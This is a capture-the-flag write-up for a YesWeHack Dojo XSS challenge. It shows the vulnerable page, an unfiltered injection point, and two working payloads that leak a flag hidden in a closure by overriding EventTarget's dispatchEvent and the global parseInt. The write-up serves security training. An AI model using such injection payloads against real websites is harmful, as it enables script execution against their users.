# YesWeHack Dojo Challenge #12

## Description
This challenge is about an XSS attack. But the challenge in this case is not about running any Javascript, but to access a specific information, that is hidden inside an anonymous function.

[Link](https://dojo-yeswehack.com/Playground#eyJkZXNjcmlwdGlvbiI6IiMgRVZFTlRUQVJHRVQgSVMgRVZFUllXSEVSRSAtIERPSk8gIzEyXG5cbiMjIENoYWxsXG5cbl9JZiBvbmx5IGl0IHdlcmUgcG9zc2libGUgdG8gdXNlIHRoZSBwYXNzd29yZCBmaWVsZCB0byBnZXQgdGhlIEZMQUcuLi5fXG5cblxuIyMgR09BTCBcblxuLSBUcmlnZ2VyIHRoZSByaWdodCBFdmVudFRhcmdldCB0byBvYnRhaW4gdGhlIHNlY3JldCBGTEFHLlxuXG4qKkJSVVRFIEZPUkNFIElTIE5PVCBBTExPV0VEKioiLCJzb2x1dGlvbiI6bnVsbCwiaGludHMiOltdLCJxdWVyeSI6eyJiYWNrZW5kIjoiWFNTIiwidGVtcGxhdGUiOiI8aHRtbD5cblx0PGhlYWQ+PC9oZWFkPlxuXHQ8Ym9keT5cblx0XHQ8cCBpZD1cInJlc3VsdFwiPjwvcD5cblx0XHQ8c2NyaXB0PlxuXHRcdFx0Y29uc3QgdmFsaWRhdGUgPSAoZnVuY3Rpb24oKXtcblx0XHRcdFx0Y29uc3QgU2VjcmV0RXZlbnQgPSBDdXN0b21FdmVudDtcblx0XHRcdFx0Y2xhc3MgU2VjcmV0IGV4dGVuZHMgRXZlbnRUYXJnZXQge1xuXHRcdFx0XHRcdGNvbnN0cnVjdG9yKCkge1xuXHRcdFx0XHRcdFx0c3VwZXIoKTtcblx0XHRcdFx0XHRcdHRoaXMuZmxhZyA9IGBGTEFHeyR7cGFyc2VJbnQoTWF0aC5yYW5kb20oKSAqIE51bWJlci5NQVhfU0FGRV9JTlRFR0VSKS50b1N0cmluZygzNil9fWA7XG5cdFx0XHRcdFx0XHR0aGlzLmFkZEV2ZW50TGlzdGVuZXIoJ3ZhbGlkYXRlJywgZSA9PiB7XG5cdFx0XHRcdFx0XHRcdGlmIChlLmRldGFpbCA9PT0gdGhpcy5mbGFnKXtcblx0XHRcdFx0XHRcdFx0XHRyZXN1bHQuaW5uZXJIVE1MID0gJ0dvb2QhIEJ1dCBjYW4geW91IGxlYWsgdGhlIGZsYWc/Jztcblx0XHRcdFx0XHRcdFx0fVxuXHRcdFx0XHRcdFx0XHRlbHNlIHtcblx0XHRcdFx0XHRcdFx0XHRyZXN1bHQuaW5uZXJIVE1MID0gJ1dyb25nIHBhc3N3b3JkISc7XG5cdFx0XHRcdFx0XHRcdH1cblx0XHRcdFx0XHRcdH0pXG5cdFx0XHRcdFx0fVxuXHRcdFx0XHRcdHZhbGlkYXRlKHRleHQpIHtcblx0XHRcdFx0XHRcdHRoaXMuZGlzcGF0Y2hFdmVudChuZXcgU2VjcmV0RXZlbnQoJ3ZhbGlkYXRlJywge2RldGFpbDogdGV4dH0pKVxuXHRcdFx0XHRcdH1cblx0XHRcdFx0fVxuXHRcdFx0XHRyZXR1cm4gdGV4dCA9PiB7bmV3IFNlY3JldCgpLnZhbGlkYXRlKHRleHQpfTtcblx0XHRcdH0pKCk7XG5cdFx0PC9zY3JpcHQ+XG5cdFx0PHNjcmlwdD5cblx0XHRcdEV2ZW50VGFyZ2V0ID0gbnVsbDtcblx0XHRcdHZhbGlkYXRlKFwiJHBhc3N3b3JkXCIpO1xuXHRcdDwvc2NyaXB0PlxuXHQ8L2JvZHk+XG48L2h0bWw+XG5cbiIsImZpbHRlcnMiOnsiJHBhc3N3b3JkIjpbXX19fQ==) to the challenge

This is the whole code of the challenge:

``` html
<html>
	<head></head>
	<body>
		<p id="result"></p>
		<script>
			const validate = (function(){
				const SecretEvent = CustomEvent;
				class Secret extends EventTarget {
					constructor() {
						super();
						this.flag = `FLAG{${parseInt(Math.random() * Number.MAX_SAFE_INTEGER).toString(36)}}`;
						this.addEventListener('validate', e => {
							if (e.detail === this.flag){
								result.innerHTML = 'Good! But can you leak the flag?';
							}
							else {
								result.innerHTML = 'Wrong password!';
							}
						})
					}
					validate(text) {
						this.dispatchEvent(new SecretEvent('validate', {detail: text}))
					}
				}
				return text => {new Secret().validate(text)};
			})();
		</script>
		<script>
			EventTarget = null;
			validate("$password");
		</script>
	</body>
</html>
```

## Introduction

### The Input
This is the HTML-part, where we can inject arbitrary Javascript-Code.

``` html
<script>
    EventTarget = null;
    validate("$password");
</script>
```

The password input is not filtered nor sanizited in any way. That makes it possible to escape the quote and inject e.g. a simple alert("XSS") like this:

``` html
<script>
    EventTarget = null;
    validate("", alert("XSS"), "");
</script>
```

One thing to note here is, that EventTarget is set to `null` and therefore not - directly - accessible through the injected code.

### The secret
Here is the part that hides the secret flag inside an anonymous function:

``` html
<script>
    const validate = (function(){
        const SecretEvent = CustomEvent;
        class Secret extends EventTarget {
            constructor() {
                super();
                this.flag = `FLAG{${parseInt(Math.random() * Number.MAX_SAFE_INTEGER).toString(36)}}`;
                this.addEventListener('validate', e => {
                    if (e.detail === this.flag){
                        result.innerHTML = 'Good! But can you leak the flag?';
                    }
                    else {
                        result.innerHTML = 'Wrong password!';
                    }
                })
            }
            validate(text) {
                this.dispatchEvent(new SecretEvent('validate', {detail: text}))
            }
        }
        return text => {new Secret().validate(text)};
    })();
</script>
```

The anonymous function creates a new `EventTarget` called `Secret`. Any new Secret-Object creates a new flag inside its constructor and adds an `EventListener` that will be used to validate the password.

## Exploitation

### Solution one
One way to get access to the flag is via the `Secret`-Object. So the solution in this case is to overwrite the `dispatchEvent`-Function of `EventTarget`. As we have seen above, the `EventTarget`-Class has been set to `null`, so that we do not have any chance to access it directly. But taking the title of this challenge as hint, we have to look for another way to get access to it: _EVENTTARGET IS EVERYWHERE_ 

Looking at the MDN-Page of `EventTarget` we can find this text:

_Element, Document, and Window are the most common event targets, but other objects can be event targets, too. For example XMLHttpRequest, AudioNode, AudioContext, and others._ 

Looking for such an `EventTarget`, we can find `XMLHttpRequestEventTarget`. That means `XMLHttpRequestEventTarget.__proto__` gives us access to `EventTarget` and we are able to overwrite the `dispatchEvent`-Function like this:

``` javascript
EventTarget = XMLHttpRequestEventTarget.__proto__;
EventTarget.prototype.dispatchEvent = function(e){ result.innerHTML = this.flag };
```
So, as soon as the validate-Event is dispatched within the `validate`-Function of `Secret`, we get access to the flag.

So that in the end, this payload writes the flag to the HTML-Page:

``` javascript
password = 'a",(() => { EventTarget = XMLHttpRequestEventTarget.__proto__; EventTarget.prototype.dispatchEvent = function(e){ result.innerHTML = this.flag }})(),"'
```

This is how it looks with the full context:
``` html
<script>
    EventTarget = null;
    validate("a",(() => {   EventTarget = XMLHttpRequestEventTarget.__proto__; EventTarget.prototype.dispatchEvent = function(e){ result.innerHTML = this.flag }})(),"");
</script>
```

### Solution two
Taking a similar approach of overwriting a function used for the flag gives us another way to solve this challenge. For this solution we take into account, that we can see the way the flag is generated in the source code: it consists of a "static" frame that begins with `FLAG{` and ends with `}`. The only unknown part is the random number that is generated with the following part of the code:

``` javascript
`FLAG{${parseInt(Math.random() * Number.MAX_SAFE_INTEGER).toString(36)}}`;
```

So this solution is based on the fact, that we can overwrite the global `parseInt` as well. This gives us the possibility to get the random number that is used for the flag:

``` javascript
parseInt = function(x) {
    x = Math.trunc(x);
    window.name = `FLAG{${x.toString(36)}}`;
    return x;
}
result.innerHTML = window.name
```

So the first thing we do inside the "new" `parseInt`-Function is exactly the same as the original would do. We just use `Math.trunc` instead. But before returning the value, we temporarily store it in `window.name`, so that we can write it to the resulting HTML-Document afterwards.

The resulting payload looks like this:

``` javascript
password = 'a",(() => { parseInt = function(x) { x = Math.trunc(x); window.name = `FLAG{${x.toString(36)}}`; return {"toString": (b) => x.toString(b)}};})());(result.innerHTML = window.name + "'
```